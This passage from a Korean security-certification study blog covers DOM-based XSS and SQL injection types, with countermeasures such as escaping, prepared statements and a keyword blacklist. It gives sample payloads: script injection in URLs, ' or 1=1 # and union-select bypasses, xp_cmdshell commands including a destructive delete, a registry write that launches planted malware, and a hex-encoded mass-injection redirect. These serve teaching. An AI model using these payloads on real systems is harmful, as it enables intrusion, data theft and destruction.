      &lt;li&gt;DOM based XSS
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;DOM (Document Object Model) : HTML/XML 문서 (계층구조)
                &lt;ul&gt;
                  &lt;li&gt;W3C 에서 정의&lt;/li&gt;
                  &lt;li&gt;HTML/XML 문서의 접근방법을 표준으로 정의하는 모델&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;HTML
                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &amp;lt;html&amp;gt;
          &amp;lt;head&amp;gt;
              &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
          &amp;lt;/head&amp;gt;
          &amp;lt;body&amp;gt;
              &amp;lt;h2&amp;gt;&amp;lt;/h2&amp;gt;
          &amp;lt;/body&amp;gt;
      &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
              &lt;li&gt;XML
                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &amp;lt;book&amp;gt;
          &amp;lt;subject&amp;gt;&amp;lt;/subject&amp;gt;
          &amp;lt;writer&amp;gt;&amp;lt;/writer&amp;gt;
      &amp;lt;/book&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
              &lt;li&gt;DOM based XSS
                &lt;ul&gt;
                  &lt;li&gt;Stored XSS, Reflected XSS 와 달리 서버의 응답과 관계없음&lt;/li&gt;
                  &lt;li&gt;피해자의 브라우저에서 발생&lt;/li&gt;
                  &lt;li&gt;피해자의 브라우저가 DOM 구문분석을 할 때 악성스크립트 실행&lt;/li&gt;
                  &lt;li&gt;Javascript 가 DOM 내용을 변화시킴&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공격방식
            &lt;ul&gt;
              &lt;li&gt;공격자가 희생자에게 메일링크(악성스크립트 포함)가 포함된 메일을 보냄&lt;/li&gt;
              &lt;li&gt;희생자가 링크를 클릭하면 웹서버에 요청&lt;/li&gt;
              &lt;li&gt;웹서버가 응답 (악성스크립트 미포함)&lt;/li&gt;
              &lt;li&gt;희생자의 요청에 포함된 URL 악성스크립트가 그대로 남아있음&lt;/li&gt;
              &lt;li&gt;URL 쿼리스트링의 파라미터를 응답페이지에 있는 DOM을 이용해서 동적으로 악성스크립트를 실행
                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &amp;lt;HTML&amp;gt;
          &amp;lt;HEAD&amp;gt;&amp;lt;TITLE&amp;gt;Welcome&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;
          &amp;lt;script&amp;gt;
              var pos = document.URL.indexOf(&quot;name=&quot;)+5;
              document.write(document.URL.substring(pos,document.URL.length))
              /*
              http://www.abc.com/page.php?name=kim
              http://www.abc.com/page.php?name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;
              */
          &amp;lt;/script&amp;gt;
          &amp;lt;body&amp;gt;
              안녕하세요
              아래페이지를 참고하세요
              링크페이지 &amp;lt;!-- 악성코드 url --&amp;gt;
          &amp;lt;/body&amp;gt;
      &amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
                &lt;ul&gt;
                  &lt;li&gt;이메일 링크 등에 악성스크립트를 포함한 url 전송&lt;/li&gt;
                  &lt;li&gt;url 클릭 시 document.write 함수가 있는 서버로 연결&lt;/li&gt;
                  &lt;li&gt;클라이언트 브라우저에서 DOM 에 악성코드를 추가&lt;/li&gt;
                  &lt;li&gt;브라우저에서 악성스크립트 실행&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">XSS(Cross Site Script)</summary></entry><entry><title type="html">정보보안 - SQL Injection</title><link href="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/" rel="alternate" type="text/html" title="정보보안 - SQL Injection" /><published>2021-06-28T19:00:00+09:00</published><updated>2021-06-28T19:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-SQL_Injection</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/">&lt;h1 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h1&gt;

&lt;h2 id=&quot;sql-injection-1&quot;&gt;SQL Injection&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격
        &lt;ul&gt;
          &lt;li&gt;예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나&lt;/li&gt;
      &lt;li&gt;Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편
        &lt;ul&gt;
          &lt;li&gt;스캐닝 툴
            &lt;ul&gt;
              &lt;li&gt;Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검&lt;/li&gt;
              &lt;li&gt;SQLMap (Python) : 블라인드 SQL Injection 점검&lt;/li&gt;
              &lt;li&gt;Absinthe : 블라인드 SQL Injection 점검&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;입력 값 필터링이 제대로 이루어지지 않는 경우 발생&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web Application 의 일반적인 인증 절차
    &lt;ul&gt;
      &lt;li&gt;ID/PW 입력&lt;/li&gt;
      &lt;li&gt;SQL Query 생성&lt;/li&gt;
      &lt;li&gt;Database 에 쿼리 전송&lt;/li&gt;
      &lt;li&gt;Database 에서 쿼리 실행&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;공격방식에 따른 분류
    &lt;ul&gt;
      &lt;li&gt;Form SQL Injection
        &lt;ul&gt;
          &lt;li&gt;구조
            &lt;ul&gt;
              &lt;li&gt;HTML
                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &amp;lt;form&amp;gt;
          &amp;lt;input /&amp;gt;
          &amp;lt;submit&amp;gt;
      &amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                &lt;/div&gt;
              &lt;/li&gt;
              &lt;li&gt;웹서버
                &lt;ul&gt;
                  &lt;li&gt;PHP, JSP, ASP 처리&lt;/li&gt;
                  &lt;li&gt;쿼리문 생성&lt;/li&gt;
                  &lt;li&gt;WHERE 절을 TRUE 로 만든다 (공격예시)&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;DB&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;주석처리문자
            &lt;ul&gt;
              &lt;li&gt;MySQL : # , MSSQL : –, ORACLE : –&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;URL 인코딩 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%xx&lt;/code&gt; 로 표기, xx 는 16진수)
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; -&amp;gt; %23&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&lt;/code&gt; -&amp;gt; %2D&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt; -&amp;gt; %27&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; -&amp;gt; %3D&lt;/li&gt;
              &lt;li&gt;공백 -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; 혹은 %20&lt;/li&gt;
              &lt;li&gt;널문자 -&amp;gt; %00&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; -&amp;gt; %3B&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;취약점 있는지 여부 파악 방법
            &lt;ul&gt;
              &lt;li&gt;ID 입력 란에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt; 나 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; 입력 후 테스트
                &lt;ul&gt;
                  &lt;li&gt;Error 메시지가 출력되면 입력 값이 DB에 전달된 것 (입력검증 X) : 취약&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;예시
            &lt;ul&gt;
              &lt;li&gt;PHP 코드 (로그인처리)
                &lt;ul&gt;
                  &lt;li&gt;취약한 코드 예시
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $query = select id, pw from member where id=&apos;$id&apos; and pw=&apos;$pw&apos;;
  $result = mysql_query($query, $connect);
  $num_rows = mysql_num_rows($result);
  if($num_rows) {
      $row = mysql_fetch_array($result);
      $id = $row[id];
      echo &quot;로그인 성공&quot;;
  } else {
      echo &quot;로그인 실패&quot;;
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                  &lt;li&gt;사용자가 입력한 값을 그대로 변수에 담아옴&lt;/li&gt;
                  &lt;li&gt;변수에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1 #&lt;/code&gt; 입력할 경우
                    &lt;ul&gt;
                      &lt;li&gt;ID : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; or 1=1 #&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;pW : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  select id, pw from member where id=&apos;&apos; or 1=1#and pw=&apos;test&apos;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;URI 인코딩 메시지 (HTTP 요청메시지)
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=&apos; or 1=1#&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=%27+or+1%3d1%23&lt;/code&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대응책
            &lt;ul&gt;
              &lt;li&gt;PHP 설정파일 : php.ini
                &lt;ul&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic_quotes_gpc=on&lt;/code&gt; : GET, POST, Cookie 로 전달되는 데이터에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;(Single quote), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;(Double quote), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;(Back slash), ``(Null)(0x00) 특수문자를 일반문자로 처리 (Escape 처리)&lt;/li&gt;
                  &lt;li&gt;5.4 버전 이상에서는 설정값이 없고, mysql_real_escape_string() 함수 (MySQL 라이브러리 함수) 를 이용
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $id = mysql_real_escape_string($id)
      $pw = mysql_real_escape_string($pw)
      $query = select id, pw from member where id=&apos;$id&apos; and pw=&apos;$pw&apos;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                    &lt;ul&gt;
                      &lt;li&gt;결과 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select id, pw from member where id=&apos;\&apos; or 1=1#&apos;&lt;/code&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;Prepared Statement (선처리 질의문)
                &lt;ul&gt;
                  &lt;li&gt;동적으로 쿼리를 생성하지 않음&lt;/li&gt;
                  &lt;li&gt;사용자의 입력값을 바인딩 처리
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $stmt=$conn-&amp;gt;prepare(&quot;select id, pw from member where id=? and pw=?&quot;);
      $stmt-&amp;gt;bind_param($id, $pw);
      $stmt-&amp;gt;execute();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                  &lt;li&gt;입력값을 제외하고 사전 컴파일 처리&lt;/li&gt;
                  &lt;li&gt;입력값은 명령어가 아닌 입력값으로만 처리&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;파라미터 필터링을 이용한 SQL Injection 방지
                &lt;ul&gt;
                  &lt;li&gt;블랙리스트 생성
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      function chk_blacklist($str){
          $returnVal = false;
          $blist = array(&apos;\&apos;&apos;,&apos;\&quot;&apos;,&apos;#&apos;,&apos;--&apos;,&apos;union&apos;,&apos;selector&apos;,&apos;update&apos;,&apos;or&apos;,&apos;and&apos;,&apos;insert&apos;,&apos;update&apos;)

          ###for 문 체크
              if 포함 $returnVal = true; break;
          ###

          return $returnVal;
      }

      $chk_id = chk_blacklist($id);
      $chk_pw = chk_blacklist($pw);
      if (chk_id || chk_pw){
          ...
      }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Union SQL Injection
        &lt;ul&gt;
          &lt;li&gt;Union 명령어
            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      select id, pw from member where id=&apos;test&apos;;
      select id, pw from member where id=&apos;test&apos; union select &apos;test&apos;, &apos;1212&apos;; -- 결과값이 같을 경우 하나로 표기
      select id, pw from member where id=&apos;test&apos; union all select &apos;test&apos;, &apos;1212&apos;; -- 결과값이 같을 경우 중복 표기
      select id, pw from member where id=&apos;&apos; union select &apos;test&apos;,&apos;1234&apos;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
            &lt;ul&gt;
              &lt;li&gt;조건 : Union 은 필드의 개수가 똑같아야 결합 가능&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;컬럼을 파악할 때 사용하는 명령
  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from member where id=&apos;&apos; order by 4#;&lt;/code&gt;
            &lt;ul&gt;
              &lt;li&gt;Error code : Unknown column ‘4’ in ‘order clause’ (필드가 3개라 판단)&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공격방식
            &lt;ul&gt;
              &lt;li&gt;id 부분에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union select &apos;test&apos;, &apos;1234&apos;#&lt;/code&gt; 입력
                &lt;ul&gt;
                  &lt;li&gt;오류없이 인증 우회 가능&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;예시 : 값 비교를 통한 form SQL Injection 방어 코드
            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $query = &quot;select id, pw from member where id=$id&quot;;
      $result = mysql_query($query, $conn);
      $num_rows = mysql_num_rows($result);
      if($num_rows) {
          $row = mysql_fetch_array($result);
          $id = $row[id];
          $rec_pw = $row[pw]; // 첫번째 레코드의 pw 값을 저장
          if($pw != $rec_pw) {echo &quot;로그인실패&quot;} else {echo &quot;로그인성공&quot;}
      }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
            &lt;ul&gt;
              &lt;li&gt;Union SQL Injection 에 취약
                &lt;ul&gt;
                  &lt;li&gt;id : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos; union&apos; select &apos;test&apos;, &apos;test&apos; #&lt;/code&gt;&lt;/li&gt;
                  &lt;li&gt;pw : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Stored Procedure SQL Injection
        &lt;ul&gt;
          &lt;li&gt;저장 프로시저는 여러 쿼리문을 하나의 함수처럼 실행하여 사용하는 쿼리의 집합을 의미&lt;/li&gt;
          &lt;li&gt;특정 작업을 일괄 처리하기 위한 용도로 사용&lt;/li&gt;
          &lt;li&gt;명령어
            &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      exec master..xp_cmdshell &apos;dir c:\&apos;
      exec master..xp_cmdshell &apos;del c:\ /q/s&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec master.dbo.xp_cmdshell &apos;시스템명령어&apos;&lt;/code&gt;&lt;/li&gt;
              &lt;li&gt;확장형 저장프로시저
                &lt;ul&gt;
                  &lt;li&gt;xp_cmdshell
                    &lt;ul&gt;
                      &lt;li&gt;관리자의 권한으로 임의의 명령을 수행&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;xp_regwrite
                    &lt;ul&gt;
                      &lt;li&gt;레지스트리 작성&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec master.dbo.xp_dirtree &apos;c:\&apos;&lt;/code&gt;
                    &lt;ul&gt;
                      &lt;li&gt;디렉토리 구조&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;공격예시
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.php?tt=1234;exec master.dbo.xp_cmdshell &apos;ping 192.168.10.0&apos;&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;뒤의 명령도 실행됨.&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa.php?tt=1234;exec xp_regwrite &apos;HKEY_LOCAL_MACHINE&apos;,&apos;\software\microsoft\window...&apos;,&apos;winhelp&apos;,REG_SZ,&apos;c:\temp\hac.exe&apos;&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;레지스트리 키 작성, 윈도우 도움말을 볼 때 악성코드 실행&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\temp\hac.exe&lt;/code&gt; : 공격자가 심어놓은 악성코드&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Mass SQL Injection
        &lt;ul&gt;
          &lt;li&gt;기존의 SQL-Injection 기법보다 확장된 개념&lt;/li&gt;
          &lt;li&gt;보안장비와 필터링 설정을 우회하는 기법 (2가지 방법)
            &lt;ul&gt;
              &lt;li&gt;공격쿼리의 일부분을 HEX 인코딩&lt;/li&gt;
              &lt;li&gt;전체 쿼리를 HEX 인코딩&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대량의 DB값이 변조되어 홈페이지에 치명적인 악영향&lt;/li&gt;
          &lt;li&gt;DB값 변조시 악성 스크립트를 삽입
            &lt;ul&gt;
              &lt;li&gt;사용자들이 변조된 사이트를 방문시 감염&lt;/li&gt;
              &lt;li&gt;BOT이 설치되어 계정 해킹이나 DDOS 공격에 이용&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대상
            &lt;ul&gt;
              &lt;li&gt;공격대상이 MS-SQL 을 사용&lt;/li&gt;
              &lt;li&gt;ASP 가 가동중인 IIS 웹서버&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;특징
            &lt;ul&gt;
              &lt;li&gt;데이터베이스에 악성코드를 대량으로 삽입&lt;/li&gt;
              &lt;li&gt;자동 삽입 스크립트를 사용하여 한번에 악성코드를 대량 삽입&lt;/li&gt;
              &lt;li&gt;POST 나 HTTP Header (쿠키, 리퍼러) 를 이용한 경우 공격 로그를 찾기 어려움&lt;/li&gt;
              &lt;li&gt;악성코드 삽입 과정에서 데이터의 손실 발생&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script src=...&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; 태그를 삽입, js, swf, exe 파일&lt;/li&gt;
              &lt;li&gt;HEX 코드로 인코딩 변환
                &lt;ul&gt;
                  &lt;li&gt;대상 코드
                    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      begin
          exec (&apos;update&apos; + @t + &apos; set&apos; + @c + &quot; = &quot; &amp;lt;script&amp;gt; document.location = &quot;http://www.xxx.com&quot;&amp;lt;/script&amp;gt;&apos;&quot;)
      end
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                    &lt;/div&gt;
                  &lt;/li&gt;
                  &lt;li&gt;FW 등의 필터링을 우회&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대응방법
            &lt;ul&gt;
              &lt;li&gt;declare 구문을 이용한 공격방식 차단
                &lt;ul&gt;
                  &lt;li&gt;위해 웹 소스상의 쿼리스트링 길이 제한&lt;/li&gt;
                  &lt;li&gt;소스코드 수정 (중-장기 대응방안)&lt;/li&gt;
                  &lt;li&gt;입력문자의 필터링&lt;/li&gt;
                  &lt;li&gt;DB, System 정기 백업&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;공격유형에 따른 분류
    &lt;ul&gt;
      &lt;li&gt;에러 기반 SQL Injection
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;DB 쿼리 결과의 에러값을 이용하여 원하는 정보를 점진적으로 얻어나감&lt;/li&gt;
              &lt;li&gt;DB 에러가 외부로 노출되는 취약점을 이용한 공격&lt;/li&gt;
              &lt;li&gt;Error 메시지를 노출하지 않으면 사용할 수 없음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;예시
            &lt;ul&gt;
              &lt;li&gt;테이블명 및 필드명 획득
                &lt;ul&gt;
                  &lt;li&gt;having 이용
                    &lt;ul&gt;
                      &lt;li&gt;검색 창이 있을 시
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from member ... &lt;/code&gt;&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;group by 절이 컬럼을 기준으로 그룹을 만들 때 having 은 결과를 한번 더 필터링&lt;/li&gt;
                      &lt;li&gt;` having 1=1 –`&lt;/li&gt;
                      &lt;li&gt;오류메시지 : member.idx 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’
                        &lt;ul&gt;
                          &lt;li&gt;member : 테이블명&lt;/li&gt;
                          &lt;li&gt;idx : 필드명&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by idx --&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;오류메시지 : member.bId 열이 집계함수나 Group by 절에 없으므로 select 목록에서 사용할 수 없음… ‘??? 의 line ?번’&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;group by idx, bid --&lt;/code&gt; …&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;컬럼(필드) 타입 획득
                &lt;ul&gt;
                  &lt;li&gt;sum() 이용 : 숫자형인지 여부&lt;/li&gt;
                  &lt;li&gt;union 이용
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select sum(컬럼명) from member --&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;오류메시지 : 숫자타입의 필드(컬럼) -&amp;gt; 동일 개수의 식이 있어야 합니다.&lt;/li&gt;
                      &lt;li&gt;오류메시지 : VARCHAR 타입의 필드(컬럼) -&amp;gt; sum or avarage 연산에서는 varchar 타입 데이터 형식을 인수로 사용할 수 없습니다.&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;필드의 개수를 알고 있을 때 필드의 타입을 획득하는 방법
                    &lt;ul&gt;
                      &lt;li&gt;union select 에 NULL 을 활용&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select NULL,NULL,NULL,NULL from member&lt;/code&gt;&lt;/li&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,NULL,NULL,NULL from member&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;에러가 없으면 첫번째 컬럼은 Int 형&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;필드의 개수가 파악되면 ID, PW 를 받아올 수 있음
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select idx, name, password, ...&lt;/code&gt;&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Blind SQL Injection
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;쿼리의 결과가 참인지 거짓인지의 반응으로 취약점 발견&lt;/li&gt;
              &lt;li&gt;Limit 연산, substr(문자열 자르기), ASCII(아스키 코드 반환) 등 함수를 이용&lt;/li&gt;
              &lt;li&gt;정보를 수집하고 필드값이나 테이블 명을 추측하여 공격&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;예시
            &lt;ul&gt;
              &lt;li&gt;쿼리부분 예 (PHP)
                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      $query = &quot;select * from bbs
      where $find like &apos;%$search%&quot;
      order by idx desc&quot;;
